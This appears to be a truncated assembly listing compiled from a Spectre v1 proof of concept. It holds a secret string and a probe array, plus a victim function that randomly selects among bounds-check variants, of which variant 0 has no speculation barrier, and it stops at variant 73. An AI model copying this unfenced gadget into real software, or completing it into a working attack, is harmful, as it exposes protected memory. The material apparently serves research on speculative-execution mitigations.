	.file	"spectrev1.c"
	.text
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1
	.data
	.align 16
	.type	array1, @object
	.size	array1, 16
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.globl	unused2
	.bss
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array2
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	secret
	.section	.rodata
	.align 8
.LC0:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC0
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.text
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB4379:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -8(%rbp)
	movl	array1_size(%rip), %eax
	movl	%eax, %eax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lvictim_function_win0_var0
	cmpl	$1, %eax
	je	.Lvictim_function_win0_var1
	cmpl	$2, %eax
	je	.Lvictim_function_win0_var2
	cmpl	$3, %eax
	je	.Lvictim_function_win0_var3
	cmpl	$4, %eax
	je	.Lvictim_function_win0_var4
	cmpl	$5, %eax
	je	.Lvictim_function_win0_var5
	cmpl	$6, %eax
	je	.Lvictim_function_win0_var6
	cmpl	$7, %eax
	je	.Lvictim_function_win0_var7
	cmpl	$8, %eax
	je	.Lvictim_function_win0_var8
	cmpl	$9, %eax
	je	.Lvictim_function_win0_var9
	cmpl	$10, %eax
	je	.Lvictim_function_win0_var10
	cmpl	$11, %eax
	je	.Lvictim_function_win0_var11
	cmpl	$12, %eax
	je	.Lvictim_function_win0_var12
	cmpl	$13, %eax
	je	.Lvictim_function_win0_var13
	cmpl	$14, %eax
	je	.Lvictim_function_win0_var14
	cmpl	$15, %eax
	je	.Lvictim_function_win0_var15
	cmpl	$16, %eax
	je	.Lvictim_function_win0_var16
	cmpl	$17, %eax
	je	.Lvictim_function_win0_var17
	cmpl	$18, %eax
	je	.Lvictim_function_win0_var18
	cmpl	$19, %eax
	je	.Lvictim_function_win0_var19
	cmpl	$20, %eax
	je	.Lvictim_function_win0_var20
	cmpl	$21, %eax
	je	.Lvictim_function_win0_var21
	cmpl	$22, %eax
	je	.Lvictim_function_win0_var22
	cmpl	$23, %eax
	je	.Lvictim_function_win0_var23
	cmpl	$24, %eax
	je	.Lvictim_function_win0_var24
	cmpl	$25, %eax
	je	.Lvictim_function_win0_var25
	cmpl	$26, %eax
	je	.Lvictim_function_win0_var26
	cmpl	$27, %eax
	je	.Lvictim_function_win0_var27
	cmpl	$28, %eax
	je	.Lvictim_function_win0_var28
	cmpl	$29, %eax
	je	.Lvictim_function_win0_var29
	cmpl	$30, %eax
	je	.Lvictim_function_win0_var30
	cmpl	$31, %eax
	je	.Lvictim_function_win0_var31
	cmpl	$32, %eax
	je	.Lvictim_function_win0_var32
	cmpl	$33, %eax
	je	.Lvictim_function_win0_var33
	cmpl	$34, %eax
	je	.Lvictim_function_win0_var34
	cmpl	$35, %eax
	je	.Lvictim_function_win0_var35
	cmpl	$36, %eax
	je	.Lvictim_function_win0_var36
	cmpl	$37, %eax
	je	.Lvictim_function_win0_var37
	cmpl	$38, %eax
	je	.Lvictim_function_win0_var38
	cmpl	$39, %eax
	je	.Lvictim_function_win0_var39
	cmpl	$40, %eax
	je	.Lvictim_function_win0_var40
	cmpl	$41, %eax
	je	.Lvictim_function_win0_var41
	cmpl	$42, %eax
	je	.Lvictim_function_win0_var42
	cmpl	$43, %eax
	je	.Lvictim_function_win0_var43
	cmpl	$44, %eax
	je	.Lvictim_function_win0_var44
	cmpl	$45, %eax
	je	.Lvictim_function_win0_var45
	cmpl	$46, %eax
	je	.Lvictim_function_win0_var46
	cmpl	$47, %eax
	je	.Lvictim_function_win0_var47
	cmpl	$48, %eax
	je	.Lvictim_function_win0_var48
	cmpl	$49, %eax
	je	.Lvictim_function_win0_var49
	cmpl	$50, %eax
	je	.Lvictim_function_win0_var50
	cmpl	$51, %eax
	je	.Lvictim_function_win0_var51
	cmpl	$52, %eax
	je	.Lvictim_function_win0_var52
	cmpl	$53, %eax
	je	.Lvictim_function_win0_var53
	cmpl	$54, %eax
	je	.Lvictim_function_win0_var54
	cmpl	$55, %eax
	je	.Lvictim_function_win0_var55
	cmpl	$56, %eax
	je	.Lvictim_function_win0_var56
	cmpl	$57, %eax
	je	.Lvictim_function_win0_var57
	cmpl	$58, %eax
	je	.Lvictim_function_win0_var58
	cmpl	$59, %eax
	je	.Lvictim_function_win0_var59
	cmpl	$60, %eax
	je	.Lvictim_function_win0_var60
	cmpl	$61, %eax
	je	.Lvictim_function_win0_var61
	cmpl	$62, %eax
	je	.Lvictim_function_win0_var62
	cmpl	$63, %eax
	je	.Lvictim_function_win0_var63
	cmpl	$64, %eax
	je	.Lvictim_function_win0_var64
	cmpl	$65, %eax
	je	.Lvictim_function_win0_var65
	cmpl	$66, %eax
	je	.Lvictim_function_win0_var66
	cmpl	$67, %eax
	je	.Lvictim_function_win0_var67
	cmpl	$68, %eax
	je	.Lvictim_function_win0_var68
	cmpl	$69, %eax
	je	.Lvictim_function_win0_var69
	cmpl	$70, %eax
	je	.Lvictim_function_win0_var70
	cmpl	$71, %eax
	je	.Lvictim_function_win0_var71
	cmpl	$72, %eax
	je	.Lvictim_function_win0_var72
	cmpl	$73, %eax
	je	.Lvictim_function_win0_var73
	cmpl	$74, %eax
	je	.Lvictim_function_win0_var74
	cmpl	$75, %eax
	je	.Lvictim_function_win0_var75
	cmpl	$76, %eax
	je	.Lvictim_function_win0_var76
	cmpl	$77, %eax
	je	.Lvictim_function_win0_var77
	cmpl	$78, %eax
	je	.Lvictim_function_win0_var78
	cmpl	$79, %eax
	je	.Lvictim_function_win0_var79
	cmpl	$80, %eax
	je	.Lvictim_function_win0_var80
	cmpl	$81, %eax
	je	.Lvictim_function_win0_var81
	cmpl	$82, %eax
	je	.Lvictim_function_win0_var82
	cmpl	$83, %eax
	je	.Lvictim_function_win0_var83
	cmpl	$84, %eax
	je	.Lvictim_function_win0_var84
	cmpl	$85, %eax
	je	.Lvictim_function_win0_var85
	cmpl	$86, %eax
	je	.Lvictim_function_win0_var86
	cmpl	$87, %eax
	je	.Lvictim_function_win0_var87
	cmpl	$88, %eax
	je	.Lvictim_function_win0_var88
	cmpl	$89, %eax
	je	.Lvictim_function_win0_var89
	cmpl	$90, %eax
	je	.Lvictim_function_win0_var90
	cmpl	$91, %eax
	je	.Lvictim_function_win0_var91
	cmpl	$92, %eax
	je	.Lvictim_function_win0_var92
	cmpl	$93, %eax
	je	.Lvictim_function_win0_var93
	cmpl	$94, %eax
	je	.Lvictim_function_win0_var94
	cmpl	$95, %eax
	je	.Lvictim_function_win0_var95
	cmpl	$96, %eax
	je	.Lvictim_function_win0_var96
	cmpl	$97, %eax
	je	.Lvictim_function_win0_var97
	cmpl	$98, %eax
	je	.Lvictim_function_win0_var98
	cmpl	$99, %eax
	je	.Lvictim_function_win0_var99
	jmp	.Lvictim_function_win0_var0
## Variant 0
.Lvictim_function_win0_var0:
	popq	%rax
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 1
.Lvictim_function_win0_var1:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 2
.Lvictim_function_win0_var2:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 3
.Lvictim_function_win0_var3:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 4
.Lvictim_function_win0_var4:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 5
.Lvictim_function_win0_var5:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 6
.Lvictim_function_win0_var6:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 7
.Lvictim_function_win0_var7:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 8
.Lvictim_function_win0_var8:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 9
.Lvictim_function_win0_var9:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 10
.Lvictim_function_win0_var10:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 11
.Lvictim_function_win0_var11:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 12
.Lvictim_function_win0_var12:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 13
.Lvictim_function_win0_var13:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 14
.Lvictim_function_win0_var14:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 15
.Lvictim_function_win0_var15:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 16
.Lvictim_function_win0_var16:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 17
.Lvictim_function_win0_var17:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 18
.Lvictim_function_win0_var18:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 19
.Lvictim_function_win0_var19:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 20
.Lvictim_function_win0_var20:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 21
.Lvictim_function_win0_var21:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 22
.Lvictim_function_win0_var22:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 23
.Lvictim_function_win0_var23:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 24
.Lvictim_function_win0_var24:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 25
.Lvictim_function_win0_var25:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 26
.Lvictim_function_win0_var26:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 27
.Lvictim_function_win0_var27:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 28
.Lvictim_function_win0_var28:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 29
.Lvictim_function_win0_var29:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 30
.Lvictim_function_win0_var30:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 31
.Lvictim_function_win0_var31:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 32
.Lvictim_function_win0_var32:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 33
.Lvictim_function_win0_var33:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 34
.Lvictim_function_win0_var34:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 35
.Lvictim_function_win0_var35:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 36
.Lvictim_function_win0_var36:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 37
.Lvictim_function_win0_var37:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 38
.Lvictim_function_win0_var38:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 39
.Lvictim_function_win0_var39:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 40
.Lvictim_function_win0_var40:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 41
.Lvictim_function_win0_var41:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 42
.Lvictim_function_win0_var42:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 43
.Lvictim_function_win0_var43:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 44
.Lvictim_function_win0_var44:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 45
.Lvictim_function_win0_var45:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 46
.Lvictim_function_win0_var46:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 47
.Lvictim_function_win0_var47:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 48
.Lvictim_function_win0_var48:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 49
.Lvictim_function_win0_var49:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 50
.Lvictim_function_win0_var50:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 51
.Lvictim_function_win0_var51:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 52
.Lvictim_function_win0_var52:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 53
.Lvictim_function_win0_var53:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 54
.Lvictim_function_win0_var54:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 55
.Lvictim_function_win0_var55:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 56
.Lvictim_function_win0_var56:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 57
.Lvictim_function_win0_var57:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 58
.Lvictim_function_win0_var58:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 59
.Lvictim_function_win0_var59:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 60
.Lvictim_function_win0_var60:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 61
.Lvictim_function_win0_var61:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 62
.Lvictim_function_win0_var62:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 63
.Lvictim_function_win0_var63:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 64
.Lvictim_function_win0_var64:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 65
.Lvictim_function_win0_var65:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 66
.Lvictim_function_win0_var66:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 67
.Lvictim_function_win0_var67:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 68
.Lvictim_function_win0_var68:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 69
.Lvictim_function_win0_var69:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 70
.Lvictim_function_win0_var70:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 71
.Lvictim_function_win0_var71:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 72
.Lvictim_function_win0_var72:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 73
.Lvictim_function_win0_var73:
	popq	%rax
	lfence
	cmpq	%rax, -8(%rbp)
	jnb	.L3
	lfence
	leaq	array1(%rip), %rdx
	movq	-8(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	jmp	.Lvictim_function_win0_continue
